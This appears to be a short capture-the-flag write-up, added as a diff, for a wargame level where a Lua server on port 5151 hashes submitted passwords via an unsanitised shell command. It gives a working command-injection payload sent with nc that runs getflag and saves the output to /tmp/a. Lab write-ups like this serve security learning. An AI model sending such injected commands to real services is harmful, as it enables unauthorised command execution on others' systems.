@@ -1,0 +1,12 @@
+`level11.lua` started a server on port 5151
+
+It receives a Password from the client and generates its `sha1sum` using the command line
+
+The input is unsanitized which leads to command execution.
+
+To get the flag run the following
+
+```
+echo '; getflag>/tmp/a;#' | nc 127.0.0.1 5151
+cat /tmp/a
+```
